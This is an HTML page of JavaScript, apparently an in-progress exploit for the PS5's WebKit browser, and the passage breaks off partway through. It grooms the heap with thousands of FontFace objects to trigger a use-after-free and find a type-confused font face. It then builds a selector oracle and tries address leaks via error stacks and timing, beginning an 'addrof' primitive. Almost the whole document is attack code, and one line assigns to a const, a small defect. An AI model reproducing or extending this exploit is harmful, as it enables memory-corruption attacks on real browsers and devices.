<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v8 - Big Log</title>
<style id="s">
@font-face { font-family: prepad; src: url(nonexistent-prepad.woff); unicode-range: U+E123; }
@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
html, body {
  margin: 0; padding: 0; width: 100%; height: 100%;
  background: #000; color: #0f0;
  font-family: "Courier New", monospace;
  overflow: hidden;
}
#log {
  position: fixed;
  left: 0; top: 0;
  width: 100%; height: 100%;
  padding: 20px;
  font-size: 22px;
  line-height: 1.6;
  color: #0f0;
  background: #000;
  overflow-y: auto;
  white-space: pre-wrap;
  word-break: break-all;
  z-index: 9999;
  -webkit-user-select: text;
}
#log .hit { color: #0ff; font-weight: bold; }
#log .ok { color: #0f0; font-weight: bold; }
#log .fail { color: #f44; }
#log .warn { color: #ff0; }
#log .star { color: #f0f; font-weight: bold; font-size: 26px; }
#c { position: absolute; left: -9999px; top: -9999px; }
</style>
</head>
<body>
<div id="log"></div>
<canvas id="c" width="512" height="128"></canvas>
<script>
"use strict";

// ============================================================
//  PS5 WebKit v8 - BIG LOG VERSION
//  All output to one big readable console
//  Focus: Build primitive from confirmed confusion
// ============================================================

const logEl = document.getElementById("log");

function L(msg, cls) {
  const span = document.createElement("span");
  if (cls) span.className = cls;
  span.textContent = msg + "\n";
  logEl.appendChild(span);
  logEl.scrollTop = logEl.scrollHeight;
  try { console.log("[v8] " + msg); } catch(e) {}
}

function Lstar(msg) { L("★ " + msg + " ★", "star"); }
function Lok(msg) { L("✅ " + msg, "ok"); }
function Lfail(msg) { L("❌ " + msg, "fail"); }
function Lwarn(msg) { L("⚠️ " + msg, "warn"); }
function Lhit(msg) { L("► " + msg, "hit"); }
function Lsep() { L("──────────────────────────────────────"); }

window.onerror = function(m, s, l) { Lfail("ERROR: " + m + " @ " + l); };

// ============================================================
//  State
// ============================================================
let keepAlive = [];
let holeFaces = [];
let reclaimFaces = [];
let uafTriggered = false;
let resolvedFaces = null;
let triggerFace = null;
let confusedRCIdx = -1;

// ============================================================
//  Font Buffer
// ============================================================
const FONT_B64 = "d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";

const FONT_BYTES = (() => {
  const s = atob(FONT_B64);
  const bytes = new Uint8Array(s.length);
  for (let i = 0; i < s.length; i++) bytes[i] = s.charCodeAt(i);
  return bytes;
})();

function makeFontBuffer() {
  const copy = new Uint8Array(FONT_BYTES.length);
  copy.set(FONT_BYTES);
  return copy.buffer;
}

// ============================================================
//  Helpers
// ============================================================
function forceStyle() {
  void document.body.offsetTop;
  void document.documentElement.offsetHeight;
}

function addPads(n) {
  const sheet = document.getElementById("s").sheet;
  for (let i = 0; i < n; i++)
    sheet.insertRule(
      `@font-face { font-family: pad${i}; src: url(nonexistent-pad-${i}.woff); unicode-range: U+E000; }`,
      sheet.cssRules.length
    );
  forceStyle();
}

function addFlushRules(n) {
  const st = document.createElement("style");
  st.id = "flush";
  document.head.appendChild(st);
  const sheet = st.sheet;
  for (let i = 0; i < n; i++)
    sheet.insertRule(
      `@font-face { font-family: flush${i}; src: url(nonexistent-flush-${i}.woff); unicode-range: U+E000; }`,
      sheet.cssRules.length
    );
  forceStyle();
}

function deleteFlushRules() {
  const el = document.getElementById("flush");
  if (el && el.sheet) {
    while (el.sheet.cssRules.length) el.sheet.deleteRule(0);
    forceStyle();
  }
}

function killCache() {
  const f = new FontFace("ck" + keepAlive.length, "local(Helvetica)", { unicodeRange: "U+E124" });
  document.fonts.add(f);
  keepAlive.push(f);
}

// ============================================================
//  PHASE 1: Standard UAF setup
// ============================================================
function createHoles() {
  L("Creating 4096 holes...");
  for (let i = 0; i < 4096; i++) {
    const f = new FontFace("hole_" + i, makeFontBuffer(), {
      unicodeRange: "U+E1" + (i % 16).toString(16),
      style: i % 2 === 0 ? "normal" : "italic",
      weight: String(100 + (i % 9) * 100),
      display: ["auto","block","swap","fallback","optional"][i % 5]
    });
    document.fonts.add(f);
    holeFaces.push(f);
  }
  forceStyle();
  for (let i = 1; i < holeFaces.length; i += 2)
    document.fonts.delete(holeFaces[i]);
  forceStyle();
  for (let i = 0; i < 4; i++) {
    const tmp = [];
    for (let j = 0; j < 512; j++) tmp.push(new ArrayBuffer(4096));
  }
  Lok("Holes ready");
}

function reclaimSpray() {
  L("Spraying 4096 reclaim faces...");
  for (let i = 0; i < 4096; i++) {
    const f = new FontFace("RC_" + i, makeFontBuffer(), {
      unicodeRange: "U+0041",
      style: "italic",
      weight: "900",
      display: "block"
    });
    document.fonts.add(f);
    reclaimFaces.push(f);
  }
  forceStyle();
  Lok("Reclaim spray done");
}

// ============================================================
//  PHASE 2: Identify confusion state
// ============================================================
function checkConfusion() {
  Lsep();
  L("CHECKING CONFUSION STATE");
  Lsep();

  // Test 1: check() oracle
  const c1 = document.fonts.check("900 italic 64px trigger", "A");
  const c2 = document.fonts.check("64px trigger", "B");
  const c3 = document.fonts.check("normal 64px trigger", "A");
  const c4 = document.fonts.check("64px RC_0", "A");

  L("check(900 italic trigger, A) = " + c1 + (c1 ? " ★ CONFUSED" : ""));
  L("check(normal trigger, A)     = " + c3);
  L("check(trigger, B)            = " + c2 + (c2 ? " ★ WIDER RANGE" : ""));
  L("check(RC_0, A)              = " + c4);

  if (c1) Lok("Selector confusion CONFIRMED");
  else { Lfail("No confusion detected"); return false; }

  // Test 2: getComputedStyle
  Lsep();
  L("getComputedStyle test:");
  try {
    const d = document.createElement("div");
    d.style.cssText = "font:900 italic 64px trigger;position:absolute;left:-9999px;";
    document.body.appendChild(d);
    const cs = getComputedStyle(d);
    L("  fontWeight = " + cs.fontWeight);
    L("  fontStyle  = " + cs.fontStyle);
    L("  fontFamily = " + cs.fontFamily);
    document.body.removeChild(d);

    if (cs.fontWeight === "900" && cs.fontStyle === "italic") {
      Lok("Browser RENDERS 900 italic!");
    }
  } catch(e) { Lfail("computedStyle error: " + e.message); }

  // Test 3: Canvas measurement
  Lsep();
  L("Canvas measurement:");
  try {
    const ctx = document.getElementById("c").getContext("2d");
    ctx.font = "64px trigger";
    const w = ctx.measureText("A").width;
    L("  trigger width = " + w);

    ctx.font = "900 italic 64px trigger";
    const w2 = ctx.measureText("A").width;
    L("  900 italic trigger width = " + w2);

    ctx.font = "64px Helvetica";
    const wH = ctx.measureText("A").width;
    L("  Helvetica width = " + wH);

    if (Math.abs(w - w2) < 0.01) {
      Lhit("trigger normal === trigger 900italic (same C++ face)");
    }
  } catch(e) { Lfail("canvas error: " + e.message); }

  return true;
}

// ============================================================
//  PHASE 3: Write-through test using delete+add
//  Property setters might be cached, but if we DELETE a
//  confused RC face and ADD a replacement, the selector
//  must re-evaluate
// ============================================================
function testDeleteAddWriteThrough() {
  Lsep();
  L("DELETE+ADD WRITE-THROUGH TEST");
  Lsep();

  // Find which RC face the selector uses
  // Strategy: delete RC faces one at a time, check if
  // the confusion breaks (check returns false)

  L("Searching for the confused RC face...");
  L("Using batch removal + binary search");

  const BATCH = 256;
  const baseline = document.fonts.check("900 italic 64px trigger", "A");
  L("Baseline check = " + baseline);

  let foundIdx = -1;
  let foundBatch = -1;

  // Batch search
  for (let batch = 0; batch < reclaimFaces.length; batch += BATCH) {
    const end = Math.min(batch + BATCH, reclaimFaces.length);
    const removed = [];

    for (let i = batch; i < end; i++) {
      try { document.fonts.delete(reclaimFaces[i]); removed.push(i); } catch(e) {}
    }
    forceStyle();

    const test = document.fonts.check("900 italic 64px trigger", "A");
    if (test !== baseline) {
      Lhit("Batch " + batch + "-" + end + " broke confusion!");
      foundBatch = batch;
    }

    for (const i of removed) {
      try { document.fonts.add(reclaimFaces[i]); } catch(e) {}
    }
    forceStyle();

    if (foundBatch >= 0) break;
  }

  if (foundBatch < 0) {
    Lwarn("No single batch broke confusion");
    L("Trying: remove ALL reclaim faces...");

    for (const f of reclaimFaces) {
      try { document.fonts.delete(f); } catch(e) {}
    }
    forceStyle();
    const allRemoved = document.fonts.check("900 italic 64px trigger", "A");
    L("After removing ALL RC: check = " + allRemoved);

    // Restore
    for (const f of reclaimFaces) {
      try { document.fonts.add(f); } catch(e) {}
    }
    forceStyle();

    if (allRemoved === baseline) {
      Lwarn("Removing all RC faces did NOT break confusion");
      L("This means the confusion is NOT caused by RC faces");
      L("It might be from the hole faces or a different source");
    }
    return -1;
  }

  // Binary search within found batch
  L("Binary search in batch " + foundBatch + "...");
  let lo = foundBatch;
  let hi = Math.min(foundBatch + BATCH, reclaimFaces.length);

  while (lo < hi) {
    const mid = Math.floor((lo + hi) / 2);
    const removed = [];

    for (let i = lo; i <= mid; i++) {
      try { document.fonts.delete(reclaimFaces[i]); removed.push(i); } catch(e) {}
    }
    forceStyle();

    const test = document.fonts.check("900 italic 64px trigger", "A");

    for (const i of removed) {
      try { document.fonts.add(reclaimFaces[i]); } catch(e) {}
    }
    forceStyle();

    if (test !== baseline) {
      hi = mid;
    } else {
      lo = mid + 1;
    }
  }

  foundIdx = lo;
  confusedRCIdx = lo;
  Lstar("CONFUSED FACE: RC_" + foundIdx);

  // Verify
  try {
    document.fonts.delete(reclaimFaces[foundIdx]);
    forceStyle();
    const v1 = document.fonts.check("900 italic 64px trigger", "A");
    document.fonts.add(reclaimFaces[foundIdx]);
    forceStyle();
    const v2 = document.fonts.check("900 italic 64px trigger", "A");
    L("Verify: removed=" + v1 + " restored=" + v2);

    if (v1 !== v2) {
      Lok("WRITE-THROUGH VIA DELETE+ADD CONFIRMED!");
    }
  } catch(e) { Lfail("verify error: " + e.message); }

  return foundIdx;
}

// ============================================================
//  PHASE 4: Build oracle from delete+add control
//  If we can control which face the selector uses by
//  deleting/adding specific RC faces, we can:
//  1. Replace the confused face with one we fully control
//  2. Use the selector's behavior as an information oracle
// ============================================================
function buildOracleFromDeleteAdd(rcIdx) {
  Lsep();
  L("BUILDING ORACLE FROM DELETE+ADD");
  Lsep();

  if (rcIdx < 0) {
    Lfail("No confused face identified");
    return false;
  }

  const confusedFace = reclaimFaces[rcIdx];
  L("Target: RC_" + rcIdx);

  // Test 1: Replace with a face that has DIFFERENT unicode range
  Lsep();
  L("Test 1: Replace with different unicode range");
  try {
    document.fonts.delete(confusedFace);
    const replacement = new FontFace("RC_" + rcIdx, makeFontBuffer(), {
      unicodeRange: "U+0043", // Only 'C', not 'A'
      style: "italic",
      weight: "900",
      display: "block"
    });
    document.fonts.add(replacement);
    forceStyle();

    const checkA = document.fonts.check("900 italic 64px trigger", "A");
    const checkC = document.fonts.check("900 italic 64px trigger", "C");
    L("  After replace: check(A)=" + checkA + " check(C)=" + checkC);

    if (!checkA && checkC) {
      Lok("Unicode range change AFFECTS selector!");
      Lhit("We can control what characters the selector matches!");
    } else if (checkA) {
      Lwarn("Selector still matches A - replacement not picked up");
    }

    // Restore
    document.fonts.delete(replacement);
    document.fonts.add(confusedFace);
    forceStyle();
  } catch(e) { Lfail("Test1 error: " + e.message); }

  // Test 2: Replace with different weight
  Lsep();
  L("Test 2: Replace with different weight");
  try {
    document.fonts.delete(confusedFace);
    const replacement = new FontFace("RC_" + rcIdx, makeFontBuffer(), {
      unicodeRange: "U+0041",
      style: "normal",
      weight: "100",
      display: "auto"
    });
    document.fonts.add(replacement);
    forceStyle();

    const check900 = document.fonts.check("900 italic 64px trigger", "A");
    const check100 = document.fonts.check("100 normal 64px trigger", "A");
    L("  After replace: check(900i)=" + check900 + " check(100n)=" + check100);

    if (!check900 && check100) {
      Lok("Weight/style change AFFECTS selector!");
      Lhit("We can control which font specs match!");
    } else if (check900) {
      Lwarn("Selector still matches 900 italic");
    }

    document.fonts.delete(replacement);
    document.fonts.add(confusedFace);
    forceStyle();
  } catch(e) { Lfail("Test2 error: " + e.message); }

  // Test 3: Replace with a face using controlled ArrayBuffer
  Lsep();
  L("Test 3: Replace with controlled ArrayBuffer");
  try {
    document.fonts.delete(confusedFace);

    // Create a buffer where we control every byte
    const buf = new ArrayBuffer(0x200);
    const view = new DataView(buf);

    // Write TrueType header
    view.setUint32(0, 0x00010000, false); // sfVersion
    view.setUint16(4, 0, false);          // numTables = 0
    view.setUint16(6, 0, false);
    view.setUint16(8, 0, false);
    view.setUint16(10, 0, false);

    // Fill rest with pattern
    for (let i = 12; i < 0x200; i += 4) {
      view.setUint32(i, 0xDEADBEEF, false);
    }

    const replacement = new FontFace("RC_" + rcIdx, buf, {
      unicodeRange: "U+0041",
      style: "italic",
      weight: "900",
      display: "block"
    });
    document.fonts.add(replacement);
    forceStyle();

    L("  Controlled buffer face status: " + replacement.status);
    const checkAfter = document.fonts.check("900 italic 64px trigger", "A");
    L("  check after controlled replace: " + checkAfter);

    document.fonts.delete(replacement);
    document.fonts.add(confusedFace);
    forceStyle();
  } catch(e) { Lfail("Test3 error: " + e.message); }

  return true;
}

// ============================================================
//  PHASE 5: Address leak via selector behavior
//  Use the oracle to probe memory layout
// ============================================================
function attemptAddressLeak() {
  Lsep();
  L("ADDRESS LEAK ATTEMPTS");
  Lsep();

  // Technique 1: getComputedStyle with trigger
  L("Technique 1: computedStyle rendering");
  try {
    const d = document.createElement("div");
    d.style.cssText = "font:900 italic 64px trigger;position:absolute;left:-9999px;";
    d.textContent = "AAAA";
    document.body.appendChild(d);
    const cs = getComputedStyle(d);
    L("  font:    " + cs.font);
    L("  family:  " + cs.fontFamily);
    L("  weight:  " + cs.fontWeight);
    L("  style:   " + cs.fontStyle);
    L("  stretch: " + cs.fontStretch);
    L("  size:    " + cs.fontSize);
    document.body.removeChild(d);
  } catch(e) { Lfail("computedStyle: " + e.message); }

  // Technique 2: Error stack addresses
  Lsep();
  L("Technique 2: Error stack traces");
  const errorTests = [
    () => { triggerFace.load(); },
    () => { JSON.parse(triggerFace); },
    () => { new WeakRef(triggerFace).deref(); },
    () => { Object.keys(triggerFace.__proto__); }
  ];

  for (const fn of errorTests) {
    try {
      fn();
    } catch(e) {
      const stack = e.stack || "";
      const addrs = stack.match(/0x[0-9a-f]{6,16}/gi);
      if (addrs && addrs.length > 0) {
        Lhit("STACK ADDRESSES FOUND:");
        for (const a of addrs) {
          L("  " + a);
        }
      } else {
        // Check for decimal addresses
        const decMatch = stack.match(/@\s*(\d{8,})/g);
        if (decMatch) {
          Lhit("DECIMAL ADDRESSES:");
          for (const d of decMatch) L("  " + d);
        }
      }
    }
  }

  // Technique 3: Performance.measure memory
  Lsep();
  L("Technique 3: Memory info");
  try {
    if (performance.memory) {
      L("  jsHeapSizeLimit:  " + performance.memory.jsHeapSizeLimit);
      L("  totalJSHeapSize:  " + performance.memory.totalJSHeapSize);
      L("  usedJSHeapSize:   " + performance.memory.usedJSHeapSize);
    } else {
      L("  performance.memory not available");
    }
  } catch(e) { L("  N/A"); }

  // Technique 4: document.fonts size and iteration
  Lsep();
  L("Technique 4: FontFaceSet enumeration");
  let total = 0;
  let loaded = 0;
  let triggerEntries = [];

  for (const face of document.fonts) {
    total++;
    if (face.status === "loaded") loaded++;
    if (face.family === "trigger") {
      triggerEntries.push({
        style: face.style,
        weight: face.weight,
        stretch: face.stretch,
        display: face.display,
        status: face.status,
        unicodeRange: face.unicodeRange,
        variant: face.variant,
        featureSettings: face.featureSettings
      });
    }
  }

  L("  Total faces: " + total);
  L("  Loaded: " + loaded);
  L("  Trigger entries: " + triggerEntries.length);
  for (let i = 0; i < triggerEntries.length; i++) {
    L("  trigger[" + i + "]: " + JSON.stringify(triggerEntries[i]));
  }

  // Technique 5: Cross-face property leakage
  Lsep();
  L("Technique 5: Cross-face property check");

  // If the selector is confused, reading trigger's properties
  // through different access paths might give different results
  try {
    const viaLoad = resolvedFaces ? resolvedFaces.find(f => f.family === "trigger") : null;
    const viaFonts = null;
    for (const f of document.fonts) {
      if (f.family === "trigger") { viaFonts = f; break; }
    }

    if (viaLoad && viaFonts) {
      L("  via load():   style=" + viaLoad.style + " weight=" + viaLoad.weight);
      L("  via fonts:    style=" + viaFonts.style + " weight=" + viaFonts.weight);

      if (viaLoad.style !== viaFonts.style || viaLoad.weight !== viaFonts.weight) {
        Lstar("PROPERTY DIVERGENCE BETWEEN ACCESS PATHS!");
        Lhit("This means the JS wrapper and C++ object are DESYNCED!");
      }
    }
  } catch(e) { Lfail("cross-face: " + e.message); }

  // Technique 6: Property descriptor analysis
  Lsep();
  L("Technique 6: Property descriptors");
  try {
    const proto = Object.getPrototypeOf(triggerFace);
    const descriptors = Object.getOwnPropertyDescriptors(proto);

    for (const [key, desc] of Object.entries(descriptors)) {
      if (desc.get || desc.set) {
        L("  " + key + ": " +
          (desc.get ? "getter" : "") +
          (desc.set ? "+setter" : ""));
      }
    }
  } catch(e) { Lfail("descriptors: " + e.message); }

  // Technique 7: Timing-based C++ read detection
  Lsep();
  L("Technique 7: Timing oracle (C++ vs cached read)");
  try {
    const ITERS = 5000;
    const props = ["status", "family", "weight", "style", "display", "stretch"];

    for (const prop of props) {
      const t0 = performance.now();
      for (let i = 0; i < ITERS; i++) void triggerFace[prop];
      const elapsed = performance.now() - t0;
      const perRead = (elapsed / ITERS * 1000).toFixed(1);
      L("  " + prop.padEnd(12) + ": " + perRead + " ns/read");
    }

    Lhit("Slower properties likely read from C++ (uncached)");
  } catch(e) { Lfail("timing: " + e.message); }

  // Technique 8: font loading API for address inference
  Lsep();
  L("Technique 8: Font loading API timing");

  try {
    // Measure how long it takes to load trigger font
    // If it's already "loaded" but the load() call takes time,
    // it's re-resolving through the C++ selector
    const t0 = performance.now();
    document.fonts.load("64px trigger", "A").then(() => {
      const elapsed = performance.now() - t0;
      L("  load(trigger,A): " + elapsed.toFixed(1) + "ms");
    });

    const t1 = performance.now();
    document.fonts.load("900 italic 64px trigger", "A").then(() => {
      const elapsed = performance.now() - t1;
      L("  load(900i trigger,A): " + elapsed.toFixed(1) + "ms");
    });
  } catch(e) { Lfail("load timing: " + e.message); }
}

// ============================================================
//  PHASE 6: addrof via type confusion
//  If we have write-through via delete+add, we can:
//  1. Replace confused face with one whose font data is
//     an ArrayBuffer containing a JS object pointer
//  2. Read the pointer through rendering oracle
// ============================================================
function attemptAddrof() {
  Lsep();
  L("ADDROF CONSTRUCTION");
  Lsep();

  if (confusedRCIdx < 0) {
    Lwarn("No confused face - cannot build addrof");
    return false;
  }

  const confusedFace = reclaimFaces[confusedRCIdx];

  // Step 1: Verify we can still control the selector
  const baseline = document.fonts.check("900 italic 64px trigger", "A");
  L("Baseline confusion: " + baseline);
  if (!baseline) {
    Lfail("Confusion lost - cannot proceed");
    return false;
  }

  // Step 2: Try to make the selector use a face with
  // font data we control completely
